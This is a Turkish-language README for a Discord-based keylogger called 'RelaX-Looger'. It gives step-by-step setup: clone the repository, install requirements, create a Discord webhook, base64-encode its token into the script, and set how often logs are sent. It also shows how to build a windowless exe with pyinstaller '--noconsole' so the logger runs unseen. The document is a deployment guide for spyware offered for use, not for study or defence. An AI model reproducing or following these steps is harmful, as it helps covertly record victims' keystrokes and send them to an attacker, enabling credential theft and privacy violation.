# RelaX-Looger
Çok Basit Bir Discord Keylogger

RelaX Logger Tüm Hakları Saklıdır!

Öncelikle Selamlar Ben RelaX 

Depoyu Klonlayın Veya İndirin!
```
git clone https://github.com/RelaX0001/RelaX-Looger.git
```
Öncelikle İndirdiğiniz Ya'da Klonladığınız RelaX Logger.rar Dosyasını Klasöre Ayıklayın.

Sonra Cmd Yi Açıp Cmd Komutları İle RelaX Logger Ana Dizinine Girin.

Sonra Orada Şu Kodu Çalıştırın

## ⚙️ 〢 Kurulum
```
pip install -r requirements.txt
```
Discord'da Bir Sunucu Oluşturup Entegrasyolar'dan Webhook Oluşturun.

Oluşturulan Webhook Tokeni'ni Kopyalayıp

https://www.base64encode.org/ Adresine Gidip Üste Yapıştırıp Encode Deyin.

Sonra Altta Çıkan Base64 Kodunu Kopyalayın.

Ardından RelaX Logger.py Dosyasına Sağ Tıklayıp Txt İle Açın 
```
SEND_REPORT_EVERY = 20 #Buraya Kaç Saniye Aralıkla Log Almak İsterseniz Onu Yazın
WEBHOOK = "" # Tırnak İçine Kopyaladığnız Base 64 Kodunu Yazın.
 ```
Evet Bitti.

[[[Eğer Exe'ye Çevirmek İsterseniz!]]]

Öncelikle pip aracılığı ile pyinstaller modülünü indirin ve kurun

pip install pyinstaller

🔻🔻🔻[BUNDA CMD AÇILIR]🔻🔻🔻
```
pyinstaller --onefile RelaX Logger.py
```
🔻🔻🔻[BUNDA CMD AÇILMAZ]🔻🔻🔻
```
pyinstaller --onefile --noconsole RelaX Logger.py 
```
## 🔍 〢 Test Edildi:
- Windows 10

Creative Commons 2023-2024

Created By RelaX


